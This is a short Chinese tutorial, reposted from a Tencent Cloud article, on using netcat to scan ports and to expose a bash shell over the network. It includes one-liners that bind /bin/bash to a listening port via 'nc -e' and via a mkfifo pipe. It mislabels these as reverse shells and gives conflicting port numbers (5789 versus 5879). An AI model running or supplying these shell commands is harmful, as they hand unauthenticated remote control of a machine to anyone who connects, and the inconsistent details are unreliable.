> 转摘：[手把手教你 3 个 Linux 中快速检测端口的小技巧](https://cloud.tencent.com/developer/article/1593973)

使用 NetCat(`nc`)可以扫描单个或范围端口，其使用 TCP 或 UDP 协议跨网络连接读取和写入数据来判断端口是否可用。常用来进行开放端口的扫描检测。

`nc` 命令的选项很多，常用的选项如下：

* `-z` 表示仅扫描打开的端口而不发送任何数据；
* `-u` 表示扫描 UDP 端口，默认扫描的是 TCP 端口；
* `-v` 获取更多的详细信息。

使用示例如下：

### 1. 扫描端口

比如，扫描 IP 为`10.10.8.8`的远程计算机上端口范围为 20-80 之间打开的 TCP 端口：

```shell
> nc -z -v 10.10.8.8 20-80
nc: connect to 10.10.8.8 port 20 (tcp) failed: Connection refused
nc: connect to 10.10.8.8 port 21 (tcp) failed: Connection refused
Connection to 10.10.8.8 22 port [tcp/ssh] succeeded!
...
Connection to 10.10.8.8 80 port [tcp/http] succeeded!
```

> 如果只希望输出开放端口的信息，可以结合`grep`命令进行过滤：
> 
> ```shell
> nc -z -v 10.10.8.8 20-80 2>&1 | grep succeeded
> ```

### 2. 反弹 shell

下面的命令会在机器上开放 5879 端口：

```shell
> nc -l -vv -p 5789 -e /bin/bash
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on ::5879
Ncat: Listening on 0.0.0.0:5879
```

这个过程叫做反弹 shell，此时远程就可以使用 nc 命令连接上这个端口了：

```shell
> nc -v 192.16.1.54 5879
Connection to 192.16.1.54 port 5879 [tcp/*] succeeded!
```

### 3. 反弹出命令行操作终端

在服务器上执行下面的两个命令，就可以构造一个反弹循环：

```shell
> rm -rf /tmp/f; mkfifo /tmp/f
> cat /tmp/f | /bin/bash -i 2>&1 | nc -l 5879 > /tmp/f
```

此时客户端使用 nc 命令连接后，就能出现命令行操作终端了：

```shell
> nc -v 192.16.1.54 5879
Connection to 192.16.1.54 port 5879 [tcp/*] succeeded!
[root@localhost~]#
```

如果关闭客户端，那么服务器端的命令也会退出。如果需要客户端退出时服务器端继续监听，可以在服务器端的 nc 命令中加上`-k`选项。


